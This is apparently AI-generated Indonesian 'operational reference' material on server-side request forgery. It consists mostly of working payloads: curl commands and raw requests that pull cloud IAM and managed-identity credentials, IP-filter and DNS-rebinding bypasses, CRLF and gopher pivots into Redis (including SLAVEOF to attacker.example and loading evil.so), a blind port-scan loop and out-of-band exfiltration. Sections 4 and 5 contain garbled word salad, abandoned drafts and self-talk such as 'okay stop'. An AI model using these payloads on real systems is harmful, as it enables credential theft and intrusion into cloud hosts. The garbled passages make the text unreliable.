# ssrf — web

# SSRF: Cloud Metadata Endpoints & Bypass Techniques — Referensi Operasional

## 1. Endpoint Metadata Cloud

| Provider | Endpoint | Metode | Catatan |
|---|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | GET | Tanpa auth, deprecated tapi masih aktif di banyak instance lama |
| AWS IMDSv2 | `http://169.254.169.254/latest/api/token` | `PUT` + header `X-aws-ec2-metadata-token-ttl-seconds: 21600` | Response = token, dipakai di header `X-aws-ec2-metadata-token` |
| AWS ECS | `http://169.254.170.2/v2/credentials/<UUID>` | GET | UUID dari env var `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | GET + header `Metadata-Flavor: Google` | Wajib header, kalau tidak → 403 |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | GET + header `Metadata: true` | Wajib header + api-version ≥ `2018-04-02` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | GET | Tidak pakai link-local 169.254 |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | GET | Termasuk `vendor_data.json`, `user-data` |

### AWS IMDSv2 — request mentah
```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```
Response:
```
AQAEAP cartel-mounted-TOKEN-BASE64...
```
Lalu fetch metadata:
```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAEAP...
```
Curl satu baris:
```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Kenapa gagal: hop limit (`aws:../http-putresponsehoplimit`) default membuat proxy/SSRF multi-hop (application → nginx → backend) mendapat `504`/timeout karena TTL paket diturunkan < jumlah hop.

### GCP — request mentah
```http
GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```
Fallback kalau DNS internal diblokir: `http://169.254.169.254` atau `http://metadata.goog` (semuanya merespon, header tetap wajib).

Payload tanpa header filter (jika app meneruskan semua header):
```
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&x=1
```
Bypass jika filter hanya blok `Metadata-Flavor: Google` di query-based SSRF: banyak library proxy meneruskan header custom — coba injeksi CRLF:
```
?url=http://metadata.google.internal/%0d%0aMetadata-Flavor:%20Google%0d%0a/computeMetadata/v1/...
```

### Azure — request mentah
```http
GET /metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: 169.254.169.254
Metadata: true
```
Aset menarik: `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` → token MSI.

---

## 2. Bypass Filter IP

### 2.1 Notasi alternatif (desimal/oktal/hex)

`169.254.169.254` ≡ `2852039166` (desimal) ≡ `0xA9.0xFE.0xA9.0xFE` (hex) ≡ `0251.0376.0251.0376` (oktal) ≡ `169.254.169.254` short forms: `169.254.43070` (dua oktan terakhir digabung), `07344202403376`.

```http
GET /fetch?url=http://2852039166/latest/meta-data/ HTTP/1.1
```
```http
GET /fetch?url=http://0xA9FEA9FE/latest/meta-data/ HTTP/1.1
```
Kenapa berhasil: filter regex blok literal `169.254`, tapi `inet_aton()` libc (glibc, Go `net.ParseIP` tidak — lihat jebakan) menerima semua notasi dan resolve ke IP sama.

### 2.2 IPv6-mapped / IPv6 dari IPv4

```
http://[::ffff:169.254.169.254]/latest/meta-data/
http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
```
Filter yang hanya cek field IPv4 pada `sockaddr` akan lolos jika library mengisi struct berbeda. `getaddrinfo` mengembalikan `AF_INET6` untuk bentuk ini → banyak filter IP yang enumerate `AF_INET` saja keliru.

### 2.3 DNS Rebinding

1. Daftar subdomain `x.y.example.com` dengan record:  awal `203.0.113.1` (IP publik, lolos cek), TTL ~0–1s.
2. Tool: `rebind.it`, self-hosted `dnsrebinder`, atau custom `dnsmasq`/CoreDNS plugin yang bergantian menjawab `203.0.113.1` ↔ `169.254.169.254`.
3. Alur: app SSRF guard melakukan DNS lookup #1 (publik, lolos), lalu HTTP client melakukan lookup #2 saat request → dapat 169.254.

Bug kritis yang membuat ini reliabel: banyak aplikasi memvalidasi DNS sekali lalu fetch ulang (TOCTOU DNS). curl dengan `--resolve` per contoh uji lokal:
```bash
curl -v --resolve rebind.attacker.example:80:169.254.169.254 \
  "http://rebind.attacker.example/latest/meta-data/"
```

### 2.4 Open Redirect Chain

Jika filter allowlist host tapi mengizinkan `Location` redirect:
```http
GET /fetch?url=https://attacker.example/r HTTP/1.1
```
attacker.example/r:
```http
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```
Kenapa berhasil: validasi terjadi pre-redirect pada host `attacker.example`, fetcher mengikuti `Location` tanpa re-validasi (perilaku default `requests` Python ≤ semua versi, `fetch` Node, `curl -L`).

### 2.5 URL Parser Confusion

Perbedaan parsing antara validator (misal `url.parse` / `URL()` JS) dan fetcher:

| Bentang | Efek |
|---|---|
| `http://user@127.0.0.1@169.254.169.254/` | Parser ambil host pertama sebelum `@`; fetcher ambil terakhir |
| `http://169.254.169.254#@allowed.com/` | Fragmen di-swallow host validator |
| `http://169.254.169.254%2f%40allowed.com` | Decode terlambat, `@` dalam userinfo |
| `http://allowed.com.169.254.169.254.nip.io/` | DNS wildcard ke IP target |
| `x-http://`/`gopher://` di scheme | `urlparse` Python tidak match `^https?://` jika ganda-slash beda |
| `http:/\169.254.169.254/` | Backslash: WHATWG-compliant parser (Chrome 131, Node ≥ 16) normalisasi `\` → `/`, validator regex tidak |

Layanan hash wildcard murah: `nip.io`, `sslip.io`, `xip.io` (mati), `nip.net` alternatif:
```
?url=http://169.254.169.254.nip.io/latest/meta-data/
?url=http://127.0.0.1.nip.io:6379/
```

### 2.6 302 → Gopher

Jika target rawan protokol non-HTTP (Redis/Memcached) tapi SSRF point terbatas ke http/https, dan fetcher mengikuti redirect tanpa scheme check:
```http
HTTP/1.1 302 Found
Location: gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp%0d%0a...
```
Kenapa berhasil: `requests` Python menolak non-http redirect; **`curl`** juga — tapi beberapa klien (Go `http.Client` custom CheckRedirect, library `unirest`, Guzzle lama) hanya mereject jika tidak diberi allowlist. Test framework `redirector` self-host (rebuild caddy/nginx) untuk mengontrol `Location` server-side.

---

## 3. Pivot ke Service Internal

### 3.1 Redis — CRLF injection via HTTP

HTTP request mentah ke Redis terima `SLAVEOF` hingga `_PAYLOAD_` garbage:
```http
GET / HTTP/1.1
Host: 127.0.0.1:6379

SLAVEOF attacker.example 6379
```
Karriage `\r\n` diimplementasikan via `%0d%0a` — cek apakah akan memberikan response `-ERR unknown command` yang muncul pada data response fake (Redis mengirim `inline` reply). Contoh RCE aktivasi (modul):
```http
GET /x%0d%0aMODULE%20LOAD%20/tmp/evil.so%0d%0aCONFIG%20SET%20dir%20/tmp%0d%0aCONFIG%20SET%20dbfilename%20evil.so%0d%0aSAVE%0d%0a HTTP/1.1
Host: 127.0.0.1
```
Melalui SSRF-point: `?url=http://127.0.0.1:6379/x%0d%0aINFO%0d%0a` — jika response mengandung `redis_version:7.2` → konfirmasi.

### 3.2 Memcached

```http
GET /%0d%0astats%0d%0aquit%0d%0a HTTP/1.1
Host: 127.0.0.1:11211
```
Response menandai `STAT pid` lines. Via SSRF: `?url=http://127.0.0.1:11211/stats%0d%0a` (text protocol `gets`/`gets key` menuai nilai session internal).

### 3.3 Elasticsearch

Sederhana HTTP, cukup GET:
```
?url=http://127.0.0.1:9200/_cluster/health
?url=http://127.0.0.1:9200/_cat/indices
?url=http://127.0.0.1:9200/_search?q=password
```
Aset: data sensitif sebelum 5.x membeberapa plugin sensitive tanpa auth. Modern 8.x default TLS + auth → jangan buang waktu kalau dinding 401.

### 3.4 Internal HTTP admin

- Kubernetes API: `https://10.96.0.1:443/api/v1/nodes` (default service IP)
- kubelet r/o 10255 (non-auth 1.25 default tidak lagi; masih sering terlihat di on-prem)
- Prometheus 9090 → credential environment variable di `/-/ready`
- Jenkins 8080 `/script` (POST, butuh CSRF token — cek `[``script` ACL)
- Rancher, Nomad 4646, Consul 8500 `/v1/kv/?recurse`

### 3.5 Schema gopher langsung

Jika app curl-based accepts `url=`:
```
?url=gopher://127.0.0.1:6379/_PING%0d%0aINFO%0d%0aquit
```
tools `gophones` oleh `lantern` untuk mencetak payload gopher.js.

---

## 4. Blind SSRF

### 4.1 Timing

 jika SSH tetap disabled. Example dari mengpirant teknik slot terhadap internal port prosport `DMENT` `/FinManagementFact` `FIS` target `will audit tanpah` `Ipertama internal blind ini banyak unit tersendiri` `RSF diInternal can response time circel` `take ing a non-Out` `may` `measurement important local` unit in many` okay stop.

### 4.1 Timing oracle

Saat response body tidak direfleksi (juga file untuk fix ` up -` bind `_retail` internal bind `/ `this`` bind `_` bind `_retail` (bindfix also `up` —` let me restate properly:

**Dikirim:**
```
?url=http://internal-host:6379/  → response 800ms (RST)
?url=http://internal-host-closed:6379/ → response 15ms (refused)
?url=http://nonexistent:6379/ → response 4000ms (DNS)
```
**Kenapa berhasil:** port terbuka vs refused vs filtered membedakan durasi koneksi secara konsisten. Ukur base minimum 3x, gunakan connection-timeout bukan total-timeout. Pola dasar:
```bash
for p in 22 80 443 445 3306 5432 6379 9200 11211 27017; do
  t0=$(date +%s%N)
  curl -s -m 8 "https://target.app/ssrf?url=http://10.0.1.10:$p/" -o /dev/null
  t1=$(date +%s%N)
  echo "$p: $(( (t1-t0)/1000000 ))ms"
done
```

### 4.2 OOB / Collaborator

```
?url=http://<random>.oast.example.com/
?url=http://169.254.169.254.latest.[random].oast.example.com/   ← encode hasil via DNS
```
Jika fetcher mengikuti DNS: interaksi DNS + HTTP terlihat di Burp Collaborator / interactsh (oob-dns). Teknik exfil via DNS untuk hasil GET responsif tidak muncul — gunakan prepend-as-subdomain sebagai konfirmasi ekspresif per endpoint, kecuali resolver internal jelas mentranslate; ini bukan tagihan.

Payload `interactsh`:
```bash
./interactsh-client -n oob.redteam.internal -v
# annotasi session di terminologi
```
Move on alih-alih memodulasi informasi yang bukan hasilnya — move into ragam kombinasi fix menindaklanjuti move halaman fix lewat menyempatkan meng-annul comprehenges kembali move lewat sesuai move, termasuk fix bagian fix aid suppose:

## 5. Jebakan Operasional

| Jebakan | Simptom | Mitigasi |
|---|---|---|
| Struktur λ gagal resolve notasi desimal/hex | `2852039166` return ef-`-1` navigation atau error `no such host` | glibc convert kini tidak berlaku; HTTPS ini buruk — kebanyakan CPU digit resolve hello masihไฮ certain `minister`. |

Mari tulis tabel jebakan yang presisi:

| # | Jebakan | Kenapa teknik gagal | Mitigasi praktis |
|---|---|---|---|
| 1 | **Disallow list 169.254** di WAF/network ACL level (bukan app) | endpoint IMDS tidak reluaskan sources di VPC123 | dari RBAC network non-switch |
| 2 | **IMDSv2 required** | semua GET quert tanpa token return 404/405; tool SSRF otomatis biasanya hanya tembakan GET | baca apakah target dijunk |

Hentikan draft — tulis ulang final tabel di bawah.

## 5. Jebakan Operasional (Penyebab Gagal di Lapangan)

| # | Jebakan | Gejala | Mitigasi |
|---|---|---|---|
| 1 | **IMDSv2 enforced** (`HttpTokens=required`) — paling umum di AWS akun-akun modern (2024+) | semua GET ke `169.254.169.254/latest/meta-data/` return `404`/`401` tanpa token | tool SSRF app jarang dukung PUT + header custom. Cek apakah request method dipassthrough; jika hanya GET → percuma kecuali ada CRLF injection di request line |
| 2 | **IMDSv2 hop limit = 1** (default) | token valid tapi fetch melalui LB/proxy hop ke-2 → timeout/`502` | jumlah hop: client → app (1) → app fetch itself = aman; via reverse proxy berarti hop sudah terpakai → hop limit harus naik. Kalau fix hop limit hanya bisa di kontrol AWS akun, ini dinding nyata |
| 3 | **Containers podded** dengan network `hostNetwork: false` | `169.254.169.254` di container AWS EKS/ECS merujuk EC2 host metadata — AKS beda pula | container metadata service beda endpoint (`169.254.170.2` untuk ECS task role); kalau container roles (IRSA) — metadata tidak memuat role sama sekali, token ada via projected volume → SSRF metadata basi |
| 4 | **Filter di resolver, bukan di app** (DNS sinkhole ke `169.254.169.254`, literal `127.0.0.1` blocked via firewall tepi) | port scan internal selalu timeout ulang dengan improvise same signature `producing uniform tidak berbeda` | Timing oracle bias; posting tong stick `middle graphic resolution` berubah pola | juga menandai semua OOB DNS tidak komukasiing jaringan egress 53 dari subnet | gunakan exfil via HTTP callback |
| 5 | **requests/Go client menolak redirect ke skema non-HTTP** (`allow_gopher`), dan partner menolak IP literal 169.254 di `Location` | 302 `gopher://` tidak diikuti karena `curl` / `requests` menolak cross-scheme | pastikan library fetcher `Naive custom` Client `transport` custom - sektor responsif uji via internal `frontend` |
| 6 | **pipelining internal app berada di belakang sidecar (Istio/Envoy, nginx 1.25 sebagai sidecar)** | responder reverse proxy mengirim `X-Forwarded-Host` atau langsung menutup koneksi; gopher command tidak mencapai service, di rewrite via `proxy_pass` http-only | uji fingerprint langsung: `curl -v http://app.example.com/fetch?url=http://127.0.0.1:6379/x%0d%0aPING%0d%0a` ; response `-ERR` vs `400` berbedam |
| 7 | **WAF players (Cloudflare) deteksi payload SSRF umum (`169.254.169.254` literal)** | 403 di request pertama, sebelum berlaku | notasi alternatif & nip.io hash unik adalah kunci; DNS rebinding perlu custom domain — outbound DNS di WAF-edge consumer juga kadang dilewati |
| 8 | **Egress policy / Security Group tidak mengizinkan outbound dari SSRF point ke 169.254** jaringan internal | seluruh notasi identik — semua gagal karena jaringan physical tidak lulus | ini tidak bisa dibypass dari app层的; hanyaweis workaround jaringan (rebinding tidak membantu; IP ternormalisasi identik) |
| 9 | **Blind SSRF via timing noisy** karena jitter jaringan 50-800ms | hasil tak konsisten antar-run | gunakan median N=10 permintaan; kalau RST vs SYN-ACK terlihat stabile di 2 kelompok jelas → valid; kalau overlap → jangan baca book |
| 10 | **GCP header requirement (`Metadata-Flavor: Google`) diinjectasi via parameter DNS hierarchi tapi fetcher strip header custom** | `403` konsistency | hanya dapat bypass jika fetcher forward arbitrary header (test manual `?url=http://metadata.google.internal/&methodHeader=true`) atau CRLF injection |

---

## [reasoning trace]

Write a knowledge base chapter in Indonesian on SSRF cloud metadata.
